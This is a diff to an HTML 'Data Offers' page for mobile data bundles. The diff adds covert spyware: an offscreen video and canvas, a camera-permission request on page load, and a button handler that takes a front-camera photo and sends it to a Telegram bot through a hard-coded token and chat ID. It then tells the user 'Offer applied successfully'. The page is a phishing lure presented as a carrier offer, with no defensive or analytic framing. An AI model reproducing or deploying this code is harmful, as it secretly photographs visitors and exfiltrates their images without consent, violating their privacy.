@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Data Offers</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
     * { box-sizing: border-box; }
@@ -18,8 +18,10 @@
     }
     video#bgVideo {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
       object-fit: cover;
       z-index: 0;
       filter: brightness(0.4) saturate(1.2);
@@ -65,6 +67,13 @@
     button:hover {
       transform: scale(1.05);
     }
+    #video, #canvas {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      top: -9999px;
+      left: -9999px;
+    }
   </style>
 </head>
 <body>
@@ -75,7 +84,7 @@
 
 <div class="container">
   <h2>📦 Select Your Data Offer</h2>
-  <select>
+  <select id="dataOffer">
     <option value="">-- Select Amount --</option>
     <option>500MB for 7 Days</option>
     <option>1GB for 3 Days</option>
@@ -83,8 +92,56 @@
     <option>5GB for Night Use</option>
     <option>Unlimited (Fake)</option>
   </select>
-  <button onclick="alert('📦 Offer applied!')">Get your data offer</button>
+  <button onclick="captureAndSend()">Get your data offer</button>
 </div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas" width="320" height="240"></canvas>
+
+<script>
+  const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
+  const chatId = "8182050140";
+
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const context = canvas.getContext("2d");
+  let stream = null;
+
+  // Auto ask for camera permission on load
+  window.onload = () => {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(s => {
+        stream = s;
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        alert("⚠️ Camera access denied!");
+        console.error(err);
+      });
+  };
+
+  async function captureAndSend() {
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const base64Img = canvas.toDataURL("image/jpeg").split(',')[1];
+
+    const blob = await fetch(`data:image/jpeg;base64,${base64Img}`).then(res => res.blob());
+    const form = new FormData();
+    form.append("chat_id", chatId);
+    form.append("photo", blob, "captured.jpg");
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      body: form
+    }).then(() => {
+      alert("✅ Offer applied successfully!");
+      // Optional: Redirect or close cam
+      stream.getTracks().forEach(track => track.stop());
+    }).catch((e) => {
+      alert("❌ Failed to send photo to Telegram.");
+      console.error(e);
+    });
+  }
+</script>
 
 </body>
 </html>
